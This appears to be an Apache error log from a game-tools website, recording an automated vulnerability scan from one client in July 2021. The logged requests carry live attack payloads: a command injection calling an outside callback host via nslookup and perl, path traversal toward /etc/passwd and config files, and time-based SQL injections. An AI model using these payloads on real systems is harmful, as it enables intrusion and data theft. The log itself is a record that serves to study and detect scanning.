[Wed Jul 07 19:34:02.847227 2021] [core:error] [pid 15640] (36)File name too long: [client 27.147.202.214:7042] AH00036: access to /;(nslookup hitxysfkcbjbibef45.bxss.me||perl -e "gethostbyname('hitxysfkcbjbibef45.bxss.me')")|(nslookup hitxysfkcbjbibef45.bxss.me||perl -e "gethostbyname('hitxysfkcbjbibef45.bxss.me')")&(nslookup hitxysfkcbjbibef45.bxss.me||perl -e "gethostbyname('hitxysfkcbjbibef45.bxss.me')").php failed (filesystem path '/var/www/html/h3.warframetools.com/;(nslookup hitxysfkcbjbibef45.bxss.me||perl -e "gethostbyname('hitxysfkcbjbibef45.bxss.me')")|(nslookup hitxysfkcbjbibef45.bxss.me||perl -e "gethostbyname('hitxysfkcbjbibef45.bxss.me')")&(nslookup hitxysfkcbjbibef45.bxss.me||perl -e "gethostbyname('hitxysfkcbjbibef45.bxss.me')").php')
[Wed Jul 07 19:34:03.112260 2021] [core:error] [pid 15452] [client 27.147.202.214:8902] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:03.326035 2021] [core:error] [pid 15112] [client 27.147.202.214:12787] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:03.536064 2021] [core:error] [pid 15735] [client 27.147.202.214:7151] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:34:03.623296 2021] [core:error] [pid 15118] [client 27.147.202.214:7156] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:34:03.855979 2021] [core:error] [pid 14415] [client 27.147.202.214:8929] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:34:04.082142 2021] [core:error] [pid 15671] [client 27.147.202.214:7158] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:04.201564 2021] [core:error] [pid 15113] [client 27.147.202.214:8930] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:04.321655 2021] [core:error] [pid 15658] [client 27.147.202.214:7174] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:34:04.776533 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/if(now()=sysdate(),sleep(15),0).php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:05.022969 2021] [core:error] [pid 15634] [client 27.147.202.214:8852] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:05.764078 2021] [core:error] [pid 15450] [client 27.147.202.214:7186] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:34:05.839551 2021] [core:error] [pid 14359] [client 27.147.202.214:7155] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:06.346152 2021] [core:error] [pid 15646] [client 27.147.202.214:7211] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:06.749532 2021] [core:error] [pid 15696] [client 27.147.202.214:11705] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:06.763383 2021] [core:error] [pid 15299] [client 27.147.202.214:8843] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:34:06.863964 2021] [core:error] [pid 15641] [client 27.147.202.214:7161] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:07.333938 2021] [core:error] [pid 15120] [client 27.147.202.214:8106] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:07.422273 2021] [core:error] [pid 15644] [client 27.147.202.214:11672] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Wed Jul 07 19:34:07.576878 2021] [core:error] [pid 15643] [client 27.147.202.214:8948] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:34:07.579552 2021] [core:error] [pid 15776] [client 27.147.202.214:8870] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:34:07.752139 2021] [core:error] [pid 15021] [client 27.147.202.214:7152] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Wed Jul 07 19:34:08.105128 2021] [core:error] [pid 14881] [client 27.147.202.214:11706] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:34:08.318633 2021] [core:error] [pid 15127] [client 27.147.202.214:7154] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:08.422579 2021] [core:error] [pid 15112] [client 27.147.202.214:11732] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:34:08.690118 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:08.763026 2021] [core:error] [pid 15980] [client 27.147.202.214:7082] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:08.889235 2021] [core:error] [pid 15113] [client 27.147.202.214:11769] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:09.054916 2021] [core:error] [pid 15446] [client 27.147.202.214:10907] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:09.298353 2021] [core:error] [pid 15975] [client 27.147.202.214:11790] AH00126: Invalid URI in request GET /js/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:34:09.367913 2021] [core:error] [pid 14415] [client 27.147.202.214:11759] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:34:09.883349 2021] [core:error] [pid 15498] [client 27.147.202.214:11780] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:10.196569 2021] [core:error] [pid 15450] [client 27.147.202.214:11779] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Wed Jul 07 19:34:10.332622 2021] [core:error] [pid 15220] [client 27.147.202.214:11755] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:10.341910 2021] [core:error] [pid 15643] [client 27.147.202.214:11837] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:34:10.863272 2021] [core:error] [pid 15314] [client 27.147.202.214:11660] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Wed Jul 07 19:34:11.333193 2021] [core:error] [pid 15299] [client 27.147.202.214:11768] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:11.381653 2021] [core:error] [pid 15644] [client 27.147.202.214:11833] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:34:11.585969 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:12.137903 2021] [core:error] [pid 15640] [client 27.147.202.214:7042] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:34:12.360222 2021] [core:error] [pid 15977] [client 27.147.202.214:14253] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:12.365179 2021] [core:error] [pid 15734] [client 27.147.202.214:1601] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:12.417833 2021] [core:error] [pid 15473] [client 27.147.202.214:2802] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:34:12.854925 2021] [core:error] [pid 15455] [client 27.147.202.214:1586] AH00126: Invalid URI in request GET /css/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:13.180015 2021] [core:error] [pid 15634] [client 27.147.202.214:11734] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:13.354711 2021] [core:error] [pid 15314] [client 27.147.202.214:1661] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:34:13.406896 2021] [core:error] [pid 15259] [client 27.147.202.214:1662] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:34:13.427564 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/1 waitfor delay '0:0:15' -- .php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:13.585007 2021] [core:error] [pid 15120] [client 27.147.202.214:11818] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:14.087200 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/KneLA9VZ'; waitfor delay '0:0:15' -- .php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:14.205145 2021] [core:error] [pid 15127] [client 27.147.202.214:2804] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:14.345429 2021] [core:error] [pid 15448] [client 27.147.202.214:14006] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Wed Jul 07 19:34:14.613414 2021] [core:error] [pid 15643] [client 27.147.202.214:1651] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:14.727231 2021] [autoindex:error] [pid 14857] [client 27.147.202.214:11774] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:14.753549 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/poqZrMZR' OR 435=(SELECT 435 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:14.853746 2021] [autoindex:error] [pid 15973] [client 27.147.202.214:11828] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:15.112783 2021] [php7:error] [pid 14331] [client 27.147.202.214:11651] script '/var/www/html/h3.warframetools.com/~index.php' not found or unable to stat
[Wed Jul 07 19:34:16.056349 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/QpxywN5U') OR 137=(SELECT 137 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:16.056946 2021] [core:error] [pid 15472] [client 27.147.202.214:14010] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:16.387287 2021] [php7:error] [pid 14857] [client 27.147.202.214:11774] script '/var/www/html/h3.warframetools.com/!index.php' not found or unable to stat
[Wed Jul 07 19:34:16.457571 2021] [core:error] [pid 15787] [client 27.147.202.214:7198] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:16.600764 2021] [core:error] [pid 15259] [client 27.147.202.214:10888] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:16.921625 2021] [core:error] [pid 13710] [client 27.147.202.214:14017] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:17.183971 2021] [core:error] [pid 15473] [client 27.147.202.214:6883] AH00126: Invalid URI in request GET /css/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:17.216023 2021] [core:error] [pid 15455] [client 27.147.202.214:14048] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:17.251725 2021] [core:error] [pid 15471] [client 27.147.202.214:8922] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:34:17.293902 2021] [core:error] [pid 15977] [client 27.147.202.214:14026] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:34:17.526123 2021] [core:error] [pid 15498] [client 27.147.202.214:7276] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Wed Jul 07 19:34:17.527685 2021] [core:error] [pid 14364] [client 27.147.202.214:8949] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:17.772382 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/1YVOHG6q')) OR 65=(SELECT 65 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:18.166871 2021] [core:error] [pid 15118] [client 27.147.202.214:7289] AH00126: Invalid URI in request GET /css/../../../../web.config HTTP/1.1
[Wed Jul 07 19:34:18.212627 2021] [core:error] [pid 15127] [client 27.147.202.214:7290] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:34:18.265557 2021] [core:error] [pid 14857] [client 27.147.202.214:11774] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:18.294344 2021] [core:error] [pid 14415] [client 27.147.202.214:1600] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:34:18.491720 2021] [core:error] [pid 15641] [client 27.147.202.214:11813] AH00126: Invalid URI in request GET /css/../../../../package.json HTTP/1.1
[Wed Jul 07 19:34:18.536755 2021] [core:error] [pid 15645] [client 27.147.202.214:7302] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Wed Jul 07 19:34:19.032015 2021] [core:error] [pid 15452] [client 27.147.202.214:10904] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:19.174174 2021] [core:error] [pid 15498] [client 27.147.202.214:7328] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Wed Jul 07 19:34:19.224756 2021] [core:error] [pid 15673] [client 27.147.202.214:8952] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:34:19.289631 2021] [core:error] [pid 15663] [client 27.147.202.214:7333] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:34:19.352831 2021] [core:error] [pid 15219] [client 27.147.202.214:7184] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Wed Jul 07 19:34:19.461847 2021] [core:error] [pid 14364] [client 27.147.202.214:7340] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:19.523900 2021] [core:error] [pid 15118] [client 27.147.202.214:7342] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:19.655474 2021] [core:error] [pid 15259] [client 27.147.202.214:7296] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:34:19.661863 2021] [core:error] [pid 15787] [client 27.147.202.214:7293] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Wed Jul 07 19:34:19.884696 2021] [core:error] [pid 15472] [client 27.147.202.214:7287] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:20.238713 2021] [core:error] [pid 15461] [client 27.147.202.214:7332] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:34:20.628965 2021] [core:error] [pid 14345] [client 27.147.202.214:11092] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:20.645224 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/discordbot'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:20.658667 2021] [core:error] [pid 15219] [client 27.147.202.214:11094] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:20.745415 2021] [core:error] [pid 15982] [client 27.147.202.214:11082] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Wed Jul 07 19:34:20.972748 2021] [php7:error] [pid 15308] [client 27.147.202.214:7282] script '/var/www/html/h3.warframetools.com/1'".php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:21.308504 2021] [core:error] [pid 14415] [client 27.147.202.214:8651] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:21.643053 2021] [php7:error] [pid 15308] [client 27.147.202.214:7282] script '/var/www/html/h3.warframetools.com/@@rPQvI.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:21.662320 2021] [core:error] [pid 14345] [client 27.147.202.214:3218] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:21.681635 2021] [php7:error] [pid 15646] [client 27.147.202.214:2787] script '/var/www/html/h3.warframetools.com/index (another copy).php' not found or unable to stat
[Wed Jul 07 19:34:21.696921 2021] [core:error] [pid 15473] [client 27.147.202.214:7280] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:21.818161 2021] [core:error] [pid 14331] [client 27.147.202.214:11651] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:22.019937 2021] [php7:error] [pid 15646] [client 27.147.202.214:2787] script '/var/www/html/h3.warframetools.com/index (copy).php' not found or unable to stat
[Wed Jul 07 19:34:22.353317 2021] [php7:error] [pid 15646] [client 27.147.202.214:2787] script '/var/www/html/h3.warframetools.com/index - Copy.php' not found or unable to stat
[Wed Jul 07 19:34:22.663206 2021] [authz_core:error] [pid 15127] [client 27.147.202.214:3216] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/images/.htaccess
[Wed Jul 07 19:34:22.685026 2021] [php7:error] [pid 15646] [client 27.147.202.214:2787] script '/var/www/html/h3.warframetools.com/index - Copy (2).php' not found or unable to stat
[Wed Jul 07 19:34:22.805215 2021] [core:error] [pid 15787] [client 27.147.202.214:7404] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Wed Jul 07 19:34:22.888874 2021] [core:error] [pid 15641] [client 27.147.202.214:11081] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:22.922928 2021] [core:error] [pid 15977] [client 27.147.202.214:7319] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
